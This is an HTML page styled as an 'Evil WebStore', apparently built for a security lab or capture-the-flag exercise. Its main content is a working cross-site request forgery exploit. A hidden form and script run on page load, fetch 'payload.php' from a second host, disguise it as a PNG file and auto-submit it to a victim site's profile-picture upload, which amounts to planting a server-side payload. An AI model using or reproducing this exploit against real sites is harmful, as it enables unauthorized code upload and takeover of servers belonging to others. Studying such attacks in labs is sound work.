<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WebStore - Home</title>
        <link rel="stylesheet" href="css/style.css">
    </head>
    <body>
        <!-- Navigation -->
        <nav>
            <div class="nav-brand">WebStore</div>
        </nav>

        <!-- Hero Section -->
        <div class="container">
            <div class="page-title">Welcome to Evil WebStore Sassuolo</div>
            <p style="text-align: center; font-size: 18px; margin-bottom: 40px;">Il miglior store di tutto il Sass</p>
        </div>
 
        <form id="csrf-form" method="POST" action="http://172.18.0.6/user_profile.php" 
            enctype="multipart/form-data" style="display:none;">
            <input type="hidden" name="action" value="update_picture">
            <input type="file" name="profile_picture" id="file-input">
        </form>
        
        <script>
            // Fetch the payload and populate the file input
            fetch('http://172.18.0.3/payload.php')
                .then(response => response.blob())
                .then(blob => {
                    const dataTransfer = new DataTransfer();
                    dataTransfer.items.add(new File([blob], 'payload.php', { type: 'image/png' }));
                    document.getElementById('file-input').files = dataTransfer.files;
                    
                    // Now submit the form
                    document.getElementById('csrf-form').submit();
                });
        </script>
        

        
        <!-- Footer -->
        <footer style="background: rgba(0, 0, 0, 0.8); color: white; text-align: center; padding: 15px;">
            <p>&copy; Double A</p>
        </footer>

    </body>
</html>
